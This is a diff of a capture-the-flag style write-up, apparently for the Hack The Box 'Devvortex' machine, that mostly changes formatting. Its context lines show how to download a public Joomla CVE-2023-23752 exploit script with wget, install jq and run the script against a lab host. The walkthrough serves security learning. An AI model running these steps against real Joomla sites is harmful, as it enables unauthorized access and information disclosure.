@@ -135,7 +135,6 @@ Searching on google for "CVE-2023-23752" lands me on this [github exploit](https
 <br>
 <img width="1244" height="683" alt="image" src="https://github.com/user-attachments/assets/dbc216a4-022d-46cb-94e4-f7bd4481b8d5" />
 <br>
-<br>
 Download the exploit.sh to attacker machine
 ```
 wget https://raw.githubusercontent.com/Youns92/Joomla-v4.2.8---CVE-2023-23752/refs/heads/main/exploit.sh
@@ -146,10 +145,12 @@ wget https://raw.githubusercontent.com/Youns92/Joomla-v4.2.8---CVE-2023-23752/re
 <br>
 <br>
 Update my Kali resources
+
 ```
 sudo apt-get update
 sudo apt-get install jq
 ```
+
 Remember to change the permissions of exploit.sh
 <br>
 <br>
@@ -157,9 +158,11 @@ Remember to change the permissions of exploit.sh
 <br>
 <br>
 Finally, run the exploit.
+
 ```
 ./exploit.sh http://dev.devvortex.htb
 ```
+
 <br>
 <br>
 <img width="1024" height="525" alt="image" src="https://github.com/user-attachments/assets/390a65d1-e767-4194-b760-6edcd81920a5" />
